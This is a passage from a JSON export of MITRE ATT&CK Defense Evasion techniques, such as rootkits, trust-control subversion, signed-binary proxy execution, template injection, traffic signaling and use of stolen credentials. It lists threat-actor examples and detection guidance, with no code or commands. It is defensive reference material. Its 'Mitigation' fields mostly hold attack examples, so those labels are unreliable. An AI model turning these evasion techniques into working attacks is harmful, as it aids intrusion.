        "description": "Stuxnet uses a Windows rootkit to mask its binaries and other relevant files.[24]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.[25] [26]"
      },
      {
        "id": "S0221",
        "name": "Umbreon",
        "description": "Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.[27]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components.[28][29]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can include a rootkit to hide processes, files, and startup.[30]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.[31]"
      },
      {
        "id": "G0044",
        "name": "Winnti Group",
        "description": "Winnti Group used a rootkit to modify typical server functionality.[32]"
      },
      {
        "id": "S0027",
        "name": "Zeroaccess",
        "description": "Zeroaccess is a kernel-mode rootkit.[33]"
      }
    ],
    "Detection": [
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Modification",
        "detects": "Monitor for changes made to drive letters or mount points of data storage devices for unexpected modifications that may be used by rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes and the existence of unrecognized DLLs, drivers, devices, services, and to the MBR. [2]"
      },
      {
        "id": "DS0001",
        "dsource": "Firmware",
        "dcomp": "Firmware Modification",
        "detects": "Monitor for changes made to firmware for unexpected modifications to settings and/or data that may be used by rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Subvert Trust Controls",
    "Code": "T1553",
    "Description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls.[1] Adversaries may also create or steal code signing certificates to acquire trust on target systems.[2][3]",
    "Mitigation": [
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used digital certificates to deliver malware.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Command monitoring may reveal malicious attempts to modify trust settings, such as the installation of root certificates or modifications to trust attributes/policies applied to files."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries.[1] Also analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.[1]On macOS, the removal of the com.apple.quarantine flag by a user instead of the operating system is a suspicious action and should be examined further. Also monitor software update frameworks that may strip this flag when performing updates."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Enable CryptoAPI v2 (CAPI) event logging [7] to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). [1]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor processes and arguments for malicious attempts to modify trust settings, such as the installation of root certificates or modifications to trust attributes/policies applied to files."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitoring the creation of (sub)keys within the Windows Registry may reveal malicious attempts to modify trust settings, such as the installation of root certificates. Installed root certificates are located in the Registry under HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\ and [HKLM or HKCU]\\Software[\\Policies]\\Microsoft\\SystemCertificates\\Root\\Certificates\\. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: [8]* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85* 3B1EFD3A66EA28B16697394703A72CA340A05BD5* 7F88CD7223F3C813818C994614A89C99FA3B5247* 8F43288AD272F3103B6FB1428485EA3014C0BCFE* A43489159A520F0D93D032CCAF37E7FE20A8B419* BE36A4562FB2EE05DBB3D32323ADF445084ED656* CDD4EEAE6000AC7F40C3802C171E30148030C072"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitoring changes to the Windows Registry may reveal malicious attempts to modify trust settings, such as the installation of root certificates. Installed root certificates are located in the Registry under HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\ and [HKLM or HKCU]\\Software[\\Policies]\\Microsoft\\SystemCertificates\\Root\\Certificates\\. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: [8] Also consider enabling the Registry Global Object Access Auditing [9] setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers:[10]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1553.001",
        "name": "Gatekeeper Bypass"
      },
      {
        "id": "T1553.002",
        "name": "Code Signing"
      },
      {
        "id": "T1553.003",
        "name": "SIP and Trust Provider Hijacking"
      },
      {
        "id": "T1553.004",
        "name": "Install Root Certificate"
      },
      {
        "id": "T1553.005",
        "name": "Mark-of-the-Web Bypass"
      },
      {
        "id": "T1553.006",
        "name": "Code Signing Policy Modification"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "System Binary Proxy Execution",
    "Code": "T1218",
    "Description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.[1] Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands.[2][3]",
    "Mitigation": [
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL.[4][5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may forge credential materials that can be used to gain access to web applications or Internet services."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that bypass process and/or signature based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to Windows Registry keys and/or values that may forge credential materials that can be used to gain access to web applications or Internet services."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1218.001",
        "name": "Compiled HTML File"
      },
      {
        "id": "T1218.002",
        "name": "Control Panel"
      },
      {
        "id": "T1218.003",
        "name": "CMSTP"
      },
      {
        "id": "T1218.004",
        "name": "InstallUtil"
      },
      {
        "id": "T1218.005",
        "name": "Mshta"
      },
      {
        "id": "T1218.007",
        "name": "Msiexec"
      },
      {
        "id": "T1218.008",
        "name": "Odbcconf"
      },
      {
        "id": "T1218.009",
        "name": "Regsvcs/Regasm"
      },
      {
        "id": "T1218.010",
        "name": "Regsvr32"
      },
      {
        "id": "T1218.011",
        "name": "Rundll32"
      },
      {
        "id": "T1218.012",
        "name": "Verclsid"
      },
      {
        "id": "T1218.013",
        "name": "Mavinject"
      },
      {
        "id": "T1218.014",
        "name": "MMC"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "System Script Proxy Execution",
    "Code": "T1216",
    "Description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.[1] This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.[2]",
    "Mitigation": [
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": "Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for scripts like PubPrn.vbs that may be used to proxy execution of malicious files."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor script processes, such as `cscript that may be used to proxy execution of malicious files."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1216.001",
        "name": "PubPrn"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Template Injection",
    "Code": "T1221",
    "Description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.[1]Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.[2] These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.[3] Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.[4]Adversaries may also modify the *\\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.[5][6]This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.[7][8][9]",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. [10]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.[11]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit.[12]"
      },
      {
        "id": "G0079",
        "name": "DarkHydrus",
        "description": "DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.[13]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.[14]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.[15]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads.[5] Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.[16][17][18][19][20][21]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has used decoy documents to load malicious remote payloads via HTTP.[22]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.[23][24]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.[25]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.[12]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Analyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: PowerShell), or other suspicious actions that could relate to post-compromise behavior."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Traffic Signaling",
    "Code": "T1205",
    "Description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r [1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "Mitigation": [
      {
        "id": "S0220",
        "name": "Chaos",
        "description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.[7]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port.[8][9]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.[10]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions.[11][12]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.[5]"
      },
      {
        "id": "S0519",
        "name": "SYNful Knock",
        "description": "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.[3]"
      },
      {
        "id": "S0221",
        "name": "Umbreon",
        "description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.[13]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.[14]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.[15]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze network packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, protocol port mismatch, anomalous syntax, or structure). Consider packet inspection for Wake-on-LAN magic packet consists of 6 bytes of FF followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.[16]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpcted hardware devices, or other uncommon data flows."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.[17]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1205.001",
        "name": "Port Knocking"
      },
      {
        "id": "T1205.002",
        "name": "Socket Filters"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, CommandandControl"
  },
  {
    "Title": "Trusted Developer Utilities Proxy Execution",
    "Code": "T1127",
    "Description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.[1][2][3][4] These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",
    "Mitigation": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": "Specific developer utilities may not be necessary within a given environment and should be removed if not used."
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": "Certain developer utilities should be blocked or restricted if not required."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious. Use process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1127.001",
        "name": "MSBuild"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Unused/Unsupported Cloud Regions",
    "Code": "T1535",
    "Description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.[1]",
    "Mitigation": [
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": "Cloud service providers may allow customers to deactivate unused regions.[1]"
      }
    ],
    "Detection": [
      {
        "id": "DS0030",
        "dsource": "Instance",
        "dcomp": "Instance Creation",
        "detects": "Monitor system logs to review instance activities occurring across all cloud environments and regions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Metadata",
        "detects": "Monitor and consider configuring alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Use Alternate Authentication Material",
    "Code": "T1550",
    "Description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.[1][2]Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
    "Mitigation": [
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can allow abuse of a compromised AD FS server's SAML token.[3]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.[4][5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Credential Request",
        "detects": "Monitor requests of new ticket granting ticket or service tickets to a Domain Controller, such as Windows EID 4769 or 4768, that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      },
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      },
      {
        "id": "DS0006",
        "dsource": "Web Credential",
        "dcomp": "Web Credential Usage",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource by providing web credentials (ex: Windows EID 1202) that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1550.001",
        "name": "Application Access Token"
      },
      {
        "id": "T1550.002",
        "name": "Pass the Hash"
      },
      {
        "id": "T1550.003",
        "name": "Pass the Ticket"
      },
      {
        "id": "T1550.004",
        "name": "Web Session Cookie"
      }
    ],
    "Tactic": "DefenseEvasion, LateralMovement"
  },
  {
    "Title": "Valid Accounts",
    "Code": "T1078",
    "Description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1] Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [4]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 actors leverage legitimate credentials to log into external remote services.[5]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[6][7][8][9]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used a compromised account to access an organization's VPN infrastructure.[10]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used valid accounts for initial access and privilege escalation.[11][12]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).[13]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used compromised credentials to log on to other systems.[14][15]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used previously compromised administrative accounts to escalate privileges.[16]"
      },
      {
        "id": "G0008",
        "name": "Carbanak",
        "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[17]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used a valid account to maintain persistence via scheduled task.[18]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has compromised user credentials and used valid accounts for operations.[19][20][21]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack used hard-coded credentials to gain access to a network share.[22]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[23]"
      },
      {
        "id": "G0051",
        "name": "FIN10",
        "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[24]"
      },
      {
        "id": "G0085",
        "name": "FIN4",
        "description": "FIN4 has used legitimate credentials to hijack email communications.[25][26]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[27][28][29]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.[30][31][32]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has harvested valid administrative credentials for lateral movement.[33]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used valid accounts for persistence and lateral movement.[34]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used valid credentials with various services during lateral movement.[35]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM leveraged valid accounts to maintain access to a victim network.[36]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer can use supplied user credentials to execute processes and stop services.[37]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[38]"
      },
